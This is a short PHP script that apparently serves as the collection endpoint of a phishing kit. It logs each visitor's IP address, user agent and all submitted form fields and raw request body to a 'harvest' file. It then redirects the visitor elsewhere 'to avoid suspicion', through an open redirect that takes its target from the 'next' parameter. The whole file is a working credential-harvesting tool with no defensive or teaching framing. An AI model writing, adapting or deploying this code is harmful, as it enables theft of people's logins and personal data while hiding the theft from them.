<?php
require_once __DIR__ . '/config.php';
$cfg = require __DIR__ . '/config.php';

$dataDir = $cfg['data_dir'];
if (!is_dir($dataDir)) @mkdir($dataDir, 0777, true);

$ip = '0.0.0.0';
foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $k) {
    if (!empty($_SERVER[$k])) { $ip = trim(explode(',', $_SERVER[$k])[0]); break; }
}

$record = [
    'time'    => date('c'),
    'ip'      => $ip,
    'ua'      => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
    'method'  => $_SERVER['REQUEST_METHOD'],
    'get'     => $_GET,
    'post'    => $_POST,
    'raw'     => file_get_contents('php://input'),
];

// Append to JSON log
$logFile = $cfg['harvest_file'] . '.json';
$list = [];
if (is_file($logFile)) {
    $d = json_decode((string)@file_get_contents($logFile), true);
    if (is_array($d)) $list = $d;
}
$list[] = $record;
@file_put_contents($logFile, json_encode($list, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);

// Also append a flat text line for quick tailing
$line = sprintf("[%s] %s %s | %s\n",
    $record['time'], $ip, $record['method'],
    json_encode($record['post'] ?: $record['raw'])
);
@file_put_contents($cfg['harvest_file'], $line, FILE_APPEND | LOCK_EX);

// Redirect to a benign page to avoid suspicion
$to = isset($_GET['next']) ? $_GET['next'] : $cfg['redirect_url'];
header('Location: ' . $to);
exit;
